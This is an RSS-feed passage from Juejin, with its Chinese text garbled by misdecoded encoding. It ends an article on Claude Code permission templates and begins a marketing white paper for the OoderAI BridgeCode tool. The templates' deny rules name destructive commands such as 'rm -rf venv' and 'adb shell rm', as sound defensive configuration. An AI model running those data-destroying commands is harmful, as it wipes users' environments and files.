      <span class="hljs-string">"Bash(docker:logs:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:publish)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:rm:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>æ¨¡æ¿ 2: Android å¼€å‘é¡¹ç›®</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(./gradlew:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:logcat)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:shell:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(adb:uninstall:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:shell:rm:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>æ¨¡æ¿ 3: Python æ•°æ®ç§‘å­¦é¡¹ç›®</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(python:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pip:install:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(jupyter:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pytest:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(black:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(flake8:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(pip:uninstall:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(rm:-rf:venv)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-28">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fcli-reference" target="_blank" title="https://code.claude.com/docs/zh-CN/cli-reference" ref="nofollow noopener noreferrer">Claude Code CLI å‚è€ƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fiam" target="_blank" title="https://code.claude.com/docs/zh-CN/iam" ref="nofollow noopener noreferrer">Claude Code èº«ä»½å’Œè®¿é—®ç®¡ç†</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fshellguide.html" target="_blank" title="https://google.github.io/styleguide/shellguide.html" ref="nofollow noopener noreferrer">Bash Scripting Best Practices</a></li>
</ul>
<hr/>
<blockquote>
<p>ğŸ’¡ <strong>æ€è€ƒé¢˜</strong>: ä½ çš„é¡¹ç›®ä¸­,å“ªäº›å‘½ä»¤åº”è¯¥åŠ å…¥ç™½åå•?å“ªäº›å‘½ä»¤å¿…é¡»ç¦æ­¢?å¦‚ä½•å¹³è¡¡å®‰å…¨ä¸æ•ˆç‡?</p>
</blockquote>
<p>ğŸ”— <strong>ç›¸å…³æ–‡ç« </strong>:</p>
<ul>
<li><a href="https://juejin.cn/post/7602454700503646249" target="_blank" title="https://juejin.cn/post/7602454700503646249">ä¸Šä¸€ç¯‡: å›¢é˜Ÿå®ªæ³•: CLAUDE.md ä½¿ç”¨æŠ€å·§</a></li>
</ul>
<hr/>
<p><em>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©,æ¬¢è¿ç‚¹èµã€æ”¶è—ã€åˆ†äº«!æœ‰ä»»ä½•é—®é¢˜æˆ–å»ºè®®,æ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€è®¨è®ºã€‚è®©æˆ‘ä»¬ä¸€èµ·å­¦ä¹ ,ä¸€èµ·æˆé•¿!</em></p>
<p><em>ä¹Ÿæ¬¢è¿è®¿é—®æˆ‘çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a>å‘ç°æ›´å¤šå®è—èµ„æº</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OoderAI BridgeCode äº§å“ç™½çš®ä¹¦â€”â€”å…¨æ–¹ä½èµ‹èƒ½ä¼ä¸šç¼–ç¨‹å‡çº§]]></title>    <link>https://juejin.cn/post/7603142147643392043</link>    <guid>https://juejin.cn/post/7603142147643392043</guid>    <pubDate>2026-02-05T12:51:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147643392043" data-draft-id="7603221478473482282" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OoderAI BridgeCode äº§å“ç™½çš®ä¹¦â€”â€”å…¨æ–¹ä½èµ‹èƒ½ä¼ä¸šç¼–ç¨‹å‡çº§"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-05T12:51:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OoderAI BridgeCode äº§å“ç™½çš®ä¹¦â€”â€”å…¨æ–¹ä½èµ‹èƒ½ä¼ä¸šç¼–ç¨‹å‡çº§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:51:44.000Z" title="Thu Feb 05 2026 12:51:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨AIæŠ€æœ¯é£é€Ÿè¿­ä»£ã€ä¼ä¸šæ•°å­—åŒ–è½¬å‹è¿›å…¥æ·±æ°´åŒºçš„ä»Šå¤©ï¼Œç¼–ç¨‹æ•ˆç‡ã€æŠ€æœ¯é€‚é…æ€§ä¸æ¶æ„çµæ´»æ€§æˆä¸ºåˆ¶çº¦ä¼ä¸šå‘å±•çš„æ ¸å¿ƒç—›ç‚¹ã€‚å¤šæ•°ä¼ä¸šé¢ä¸´â€œå·²æœ‰ç³»ç»Ÿä¸æ–°AIå·¥å…·è„±èŠ‚â€â€œä»£ç å¼€å‘æ•ˆç‡ä½ä¸‹â€â€œæŠ€æœ¯æ ˆç»‘å®šå¯¼è‡´å‡çº§å›°éš¾â€â€œå›¢é˜Ÿå·¥ä½œæµç¨‹æ— æ³•é€‚é…AIæ—¶ä»£éœ€æ±‚â€ç­‰é—®é¢˜ï¼ŒäºŸéœ€ä¸€æ¬¾èƒ½å¤Ÿæ‰“é€šæŠ€æœ¯æ–­å±‚ã€èµ‹èƒ½å›¢é˜Ÿé«˜æ•ˆç¼–ç¨‹ã€å…¼é¡¾çµæ´»æ€§ä¸å®ç”¨æ€§çš„ä»£ç æ¡†æ¶è§£å†³æ–¹æ¡ˆã€‚</p>
<p>ooderAI BridgeCode åº”è¿è€Œç”Ÿï¼Œèšç„¦ä¼ä¸šæ ¸å¿ƒç¼–ç¨‹éœ€æ±‚ï¼Œä»¥â€œAIç¡®å®šæ€§ä»£ç æ¡†æ¶æ„å»ºâ€ä¸ºæ ¸å¿ƒï¼Œé€šè¿‡è‡ªå­¦ä¹ èƒ½åŠ›ã€å…¨æµç¨‹é€‚é…èƒ½åŠ›ä¸å¼€æºçµæ´»ç‰¹æ€§ï¼ŒåŠ©åŠ›ä¼ä¸šå¿«é€Ÿæ­å»ºä¸“å±ä»£ç ä½“ç³»ï¼Œè¡”æ¥å·²æœ‰åº”ç”¨ä¸å‰æ²¿AIæŠ€æœ¯ï¼Œé™ä½å¼€å‘æˆæœ¬ã€æå‡ç¼–ç¨‹æ•ˆç‡ï¼Œæ¨åŠ¨ä¼ä¸šç¼–ç¨‹å·¥ä½œå‘AIåŒ–ã€é«˜æ•ˆåŒ–ã€æ ‡å‡†åŒ–è½¬å‹ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€äº§å“æ¦‚è¿°ï¼šAIé©±åŠ¨çš„ä¼ä¸šä¸“å±ä»£ç æ¡†æ¶è§£å†³æ–¹æ¡ˆ</h2>
<p>ooderAI BridgeCode æ˜¯ä¸€æ¬¾ä¸“ä¸ºä¼ä¸šæ‰“é€ çš„AIç¡®å®šæ€§ä»£ç æ¡†æ¶ç”Ÿæˆå·¥å…·ï¼Œæ ¸å¿ƒå®šä½æ˜¯â€œä¸ºä¼ä¸šå¿«é€Ÿæ„å»ºå±äºè‡ªå·±çš„AIç¡®å®šæ€§ä»£ç æ¡†æ¶ï¼ŒåŠ©åŠ›ä¼ä¸šç¼–ç¨‹â€ï¼Œå……å½“å·²æœ‰åº”ç”¨ç³»ç»Ÿä¸ ooderAI ç”Ÿæ€ä¹‹é—´çš„â€œæ¡¥æ¢â€ï¼ŒåŒæ—¶ä¸ºä¼ä¸šç¼–ç¨‹å›¢é˜Ÿæä¾›AIæ—¶ä»£çš„å…¨æµç¨‹æ”¯æ’‘ã€‚</p>
<p>ä¸åŒäºä¼ ç»Ÿä»£ç ç”Ÿæˆå·¥å…·ï¼ŒBridgeCode ä»¥â€œä¼ä¸šä¸ªæ€§åŒ–é€‚é…â€ä¸ºæ ¸å¿ƒï¼Œæ— éœ€ä¼ä¸šè¿å°±æ ‡å‡†åŒ–æ¨¡æ¿ï¼Œè€Œæ˜¯ä¸»åŠ¨å­¦ä¹ ä¼ä¸šæŠ€æœ¯ç‰¹ç‚¹ä¸ä¸šåŠ¡éœ€æ±‚ï¼Œç”Ÿæˆè´´åˆä¼ä¸šå®é™…ã€å¯ç›´æ¥è½åœ°çš„ä»£ç æ¡†æ¶ä¸å·¥ä½œä½“ç³»ï¼ŒçœŸæ­£å®ç°â€œå·¥å…·é€‚é…ä¼ä¸šï¼Œè€Œéä¼ä¸šé€‚é…å·¥å…·â€ï¼Œè®©æ¯ä¸€å®¶ä¼ä¸šéƒ½èƒ½æ‹¥æœ‰ä¸“å±çš„é«˜æ•ˆç¼–ç¨‹è§£å†³æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-2">1.1 æ ¸å¿ƒä»·å€¼</h3>
<ul>
<li><strong>é™æœ¬å¢æ•ˆ</strong>ï¼šè‡ªåŠ¨ç”Ÿæˆå…¨å¥—é€‚é…ä»£ç ï¼Œå‡å°‘æ‰‹åŠ¨ç¼–ç å·¥ä½œé‡ï¼Œç¼©çŸ­å¼€å‘å‘¨æœŸï¼Œé™ä½ä¼ä¸šäººåŠ›æˆæœ¬ä¸æ—¶é—´æˆæœ¬ï¼›</li>
<li><strong>æ‰“ç ´æ–­å±‚</strong>ï¼šæ— ç¼è¡”æ¥ä¼ä¸šå·²æœ‰åº”ç”¨ä¸ ooderAI ä»£ç ï¼Œè§£å†³æ–°æ—§ç³»ç»Ÿå…¼å®¹éš¾é¢˜ï¼Œå®ç°æŠ€æœ¯ä½“ç³»çš„å¹³æ»‘è¿‡æ¸¡ï¼›</li>
<li><strong>ä¸ªæ€§é€‚é…</strong>ï¼šåŸºäºä¼ä¸šè‡ªèº«ä»£ç ç‰¹ç‚¹ä¸æŠ€æœ¯è·¯çº¿è‡ªå­¦ä¹ ï¼Œç”Ÿæˆä¸“å±ä»£ç æ¡†æ¶ï¼Œé€‚é…ä¼ä¸šä¸ªæ€§åŒ–æŠ€æœ¯éœ€æ±‚ï¼›</li>
<li><strong>AIèµ‹èƒ½</strong>ï¼šé€‚é…AIæ—¶ä»£ç¼–ç¨‹éœ€æ±‚ï¼Œä¼˜åŒ–å›¢é˜Ÿå·¥ä½œæµç¨‹ï¼Œæ­å»ºä¸“å± skills èƒ½åŠ›åŒ…ï¼Œæ¨åŠ¨ç¼–ç¨‹å·¥ä½œå‘æ™ºèƒ½åŒ–å‡çº§ï¼›</li>
<li><strong>çµæ´»æ— ç»‘å®š</strong>ï¼šå¼€æºè®¾è®¡ï¼Œæ— æŠ€æœ¯æ ˆç»‘å®šï¼Œæ”¯æŒä¼ä¸šè‡ªä¸»æ‰©å±•ä¸å‡çº§ï¼Œä¿æŠ¤ä¼ä¸šç°æœ‰æŠ€æœ¯æŠ•èµ„ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€äº§å“æ ¸å¿ƒèƒ½åŠ›ï¼šå…¨æ–¹ä½èµ‹èƒ½ä¼ä¸šç¼–ç¨‹å‡çº§</h2>
<p>ooderAI BridgeCode ä¾æ‰˜AIæŠ€æœ¯ä¸å¼€æºç”Ÿæ€ï¼Œæ„å»ºä¸¤å¤§æ ¸å¿ƒèƒ½åŠ›ï¼Œè¦†ç›–â€œä»£ç ç”Ÿæˆâ€ä¸â€œæµç¨‹ä¼˜åŒ–â€å…¨åœºæ™¯ï¼Œä»æŠ€æœ¯å±‚é¢åˆ°ç®¡ç†å±‚é¢ï¼Œå…¨æ–¹ä½åŠ©åŠ›ä¼ä¸šç¼–ç¨‹æ•ˆç‡ä¸è´¨é‡åŒæå‡ï¼Œé€‚é…AIæ—¶ä»£ä¼ä¸šç¼–ç¨‹çš„æ ¸å¿ƒéœ€æ±‚ã€‚</p>
<h3 data-id="heading-4">2.1 è‡ªå­¦ä¹ çš„ BridgeCode ä»£ç ç”Ÿæˆèƒ½åŠ›</h3>
<p>BridgeCode æ ¸å¿ƒäº®ç‚¹åœ¨äºâ€œè‡ªå­¦ä¹ ã€è‡ªé€‚åº”â€ï¼Œæ— éœ€äººå·¥æ‰‹åŠ¨é…ç½®å¤§é‡å‚æ•°ï¼Œå³å¯è‡ªåŠ¨è´´åˆä¼ä¸šæŠ€æœ¯ä½“ç³»ï¼Œç”Ÿæˆå…¨å¥—å¯ç›´æ¥è¿è¡Œçš„ BridgeCode ä»£ç ï¼Œå®ç°å·²æœ‰åº”ç”¨ä¸ ooderAI ä»£ç çš„æ— ç¼è¡”æ¥ï¼Œå½»åº•è§£å†³â€œä»£ç ä¸å…¼å®¹ã€è¡”æ¥ç¹çâ€çš„è¡Œä¸šç—›ç‚¹ã€‚</p>
<p>å…¶æ ¸å¿ƒå·¥ä½œæµç¨‹é‡‡ç”¨WebåŒ–å¯è§†åŒ–è®¾è®¡ï¼ˆé€‚é…ä¼ä¸šWebç«¯æ“ä½œä¹ æƒ¯ï¼Œç•Œé¢ç®€æ´æ˜“ä¸Šæ‰‹ï¼‰ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>æ•°æ®é‡‡é›†</strong>ï¼šè‡ªåŠ¨é‡‡é›†ä¼ä¸šå·²æœ‰ä»£ç åº“ã€æŠ€æœ¯æ–‡æ¡£ã€å¼€å‘è§„èŒƒç­‰ç›¸å…³æ•°æ®ï¼Œæ¶µç›–ä»£ç é£æ ¼ã€å‘½åè§„èŒƒã€æŠ€æœ¯æ ˆé€‰å‹ã€æ¶æ„æ¨¡å¼ç­‰æ ¸å¿ƒä¿¡æ¯ï¼Œæ— éœ€äººå·¥æ‰‹åŠ¨ä¸Šä¼ ï¼›</li>
<li><strong>æ™ºèƒ½å­¦ä¹ </strong>ï¼šé€šè¿‡å†…ç½®AIç®—æ³•ï¼Œæ·±åº¦åˆ†æä¼ä¸šä»£ç ç‰¹ç‚¹ã€æŠ€æœ¯è·¯çº¿ä¸å¼€å‘ä¹ æƒ¯ï¼Œå»ºç«‹ä¼ä¸šä¸“å±æŠ€æœ¯æ¨¡å‹ï¼Œç²¾å‡†æ•æ‰ä¼ä¸šç¼–ç¨‹æ ¸å¿ƒéœ€æ±‚ä¸é€‚é…è¦ç‚¹ï¼›</li>
<li><strong>ä»£ç ç”Ÿæˆ</strong>ï¼šåŸºäºå­¦ä¹ åˆ°çš„ä¼ä¸šæŠ€æœ¯æ¨¡å‹ï¼Œè‡ªåŠ¨ç”Ÿæˆå…¨å¥— BridgeCode ä»£ç ï¼ŒåŒ…æ‹¬è¡”æ¥å±‚ä»£ç ã€é€‚é…å±‚ä»£ç ã€å…¼å®¹å±‚ä»£ç ç­‰ï¼Œä»£ç é£æ ¼ã€æŠ€æœ¯è§„èŒƒä¸ä¼ä¸šç°æœ‰ä»£ç å®Œå…¨ä¸€è‡´ï¼Œæ— éœ€äººå·¥äºŒæ¬¡ä¿®æ”¹ï¼›</li>
<li><strong>æ— ç¼è¡”æ¥</strong>ï¼šç”Ÿæˆçš„ BridgeCode ä»£ç å¯ç›´æ¥åµŒå…¥ä¼ä¸šå·²æœ‰åº”ç”¨ç³»ç»Ÿï¼Œå®ç°ä¸ ooderAI ä»£ç çš„æ— ç¼å¯¹æ¥ï¼Œæ”¯æŒå®æ—¶è°ƒè¯•ã€åœ¨çº¿ä¿®æ”¹ï¼ˆWebç«¯å¯è§†åŒ–è°ƒè¯•ç•Œé¢ï¼Œæ“ä½œä¾¿æ·ï¼‰ï¼Œç¡®ä¿è¡”æ¥ç¨³å®šæ— å¼‚å¸¸ï¼›</li>
<li><strong>åŠ¨æ€ä¼˜åŒ–</strong>ï¼šä¼ä¸šä»£ç ä½“ç³»ã€æŠ€æœ¯è·¯çº¿å‘ç”Ÿå˜æ›´æ—¶ï¼ŒBridgeCode å¯è‡ªåŠ¨é‡æ–°å­¦ä¹ ï¼Œæ›´æ–°ä»£ç ç”Ÿæˆé€»è¾‘ï¼Œç¡®ä¿ä»£ç æ¡†æ¶å§‹ç»ˆä¸ä¼ä¸šæŠ€æœ¯ä½“ç³»åŒæ­¥é€‚é…ï¼Œæ— éœ€é‡æ–°æ­å»ºæ¡†æ¶ã€‚</li>
</ol>
<p>WebåŒ–ç¾åŒ–é€‚é…ï¼šä»£ç ç”Ÿæˆè¿‡ç¨‹å®æ—¶å¯è§†åŒ–å±•ç¤ºï¼Œç”Ÿæˆç»“æœæ”¯æŒWebç«¯åœ¨çº¿é¢„è§ˆã€å¤åˆ¶ã€å¯¼å‡ºï¼Œè°ƒè¯•ç•Œé¢æ”¯æŒè¯­æ³•é«˜äº®ã€é”™è¯¯æç¤ºã€ä¸€é”®ä¿®å¤ï¼Œè´´åˆä¼ä¸šå¼€å‘äººå‘˜Webç«¯æ“ä½œä¹ æƒ¯ï¼Œæå‡ä½¿ç”¨ä½“éªŒã€‚</p>
<h4 data-id="heading-5">2.1.1 ä»£ç ç”Ÿæˆæ ¸å¿ƒä¸šåŠ¡æµç¨‹</h4>
<p>ä»¥ä¸‹ä¸º BridgeCode è‡ªå­¦ä¹ ä»£ç ç”ŸæˆåŠæ— ç¼è¡”æ¥çš„æ ¸å¿ƒä¸šåŠ¡æµç¨‹ç¤ºæ„å›¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/402443daf5b04774a830b9245915518a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=du1aYDY5sVio8nxdloZVqYSsyRU%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h3 data-id="heading-6">2.2 AIæ—¶ä»£å·¥ä½œæµç¨‹ä¼˜åŒ–ä¸ skills èƒ½åŠ›åŒ…æ­å»º</h3>
<p>BridgeCode ä¸æ­¢äºä»£ç ç”Ÿæˆï¼Œæ›´èšç„¦ä¼ä¸šç¼–ç¨‹å›¢é˜Ÿçš„å…¨æµç¨‹æ•ˆç‡æå‡ï¼Œç»“åˆAIæ—¶ä»£ç¼–ç¨‹ç‰¹ç‚¹ï¼Œä¸ºä¼ä¸šä¼˜åŒ–ç°æœ‰å·¥ä½œæµç¨‹ï¼Œå¹¶è¾…åŠ©æ­å»ºå…¨å¥— skills èƒ½åŠ›åŒ…ï¼Œè®©å›¢é˜Ÿå·¥ä½œæ›´è´´åˆAIæ—¶ä»£éœ€æ±‚ï¼Œå®ç°â€œæµç¨‹æ ‡å‡†åŒ–ã€èƒ½åŠ›ä½“ç³»åŒ–â€ã€‚</p>
<h4 data-id="heading-7">2.2.1 å·¥ä½œæµç¨‹æ™ºèƒ½æ¨èä¸ä¼˜åŒ–</h4>
<p>åŸºäºä¼ä¸šå·²æœ‰æŠ€æœ¯æ¶æ„ã€å›¢é˜Ÿè§„æ¨¡ã€å¼€å‘æ¨¡å¼ä¸å·¥ä½œæµç¨‹ï¼ŒBridgeCode é€šè¿‡AIåˆ†æï¼Œç²¾å‡†è¯†åˆ«ç°æœ‰æµç¨‹ä¸­çš„å†—ä½™ç¯èŠ‚ã€æ•ˆç‡ç“¶é¢ˆï¼ˆå¦‚æ²Ÿé€šæˆæœ¬é«˜ã€åˆ†å·¥ä¸æ¸…æ™°ã€é‡å¤å·¥ä½œå¤šç­‰ï¼‰ï¼Œæ¨èå¹¶ç”Ÿæˆç¬¦åˆAIæ—¶ä»£ç‰¹ç‚¹çš„æ ‡å‡†åŒ–ç¼–ç¨‹å·¥ä½œæµç¨‹ã€‚</p>
<p>ä¼˜åŒ–åçš„æµç¨‹å…·å¤‡ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li><strong>AIååŒ</strong>ï¼šèå…¥AIè¾…åŠ©ç¼–ç¨‹ç¯èŠ‚ï¼Œå¦‚ä»£ç è‡ªåŠ¨å®¡æŸ¥ã€é”™è¯¯è‡ªåŠ¨æ’æŸ¥ã€é‡å¤ä»£ç è‡ªåŠ¨ä¼˜åŒ–ï¼Œå‡å°‘äººå·¥å¹²é¢„ï¼Œæå‡ç¼–ç¨‹å‡†ç¡®æ€§ï¼›</li>
<li><strong>åˆ†å·¥æ¸…æ™°</strong>ï¼šæ˜ç¡®å›¢é˜Ÿå„è§’è‰²ï¼ˆå¼€å‘ã€æµ‹è¯•ã€è¿ç»´ï¼‰çš„èŒè´£ä¸åä½œèŠ‚ç‚¹ï¼Œæ‰“é€šå›¢é˜Ÿåä½œæ–­å±‚ï¼Œé™ä½æ²Ÿé€šæˆæœ¬ï¼›</li>
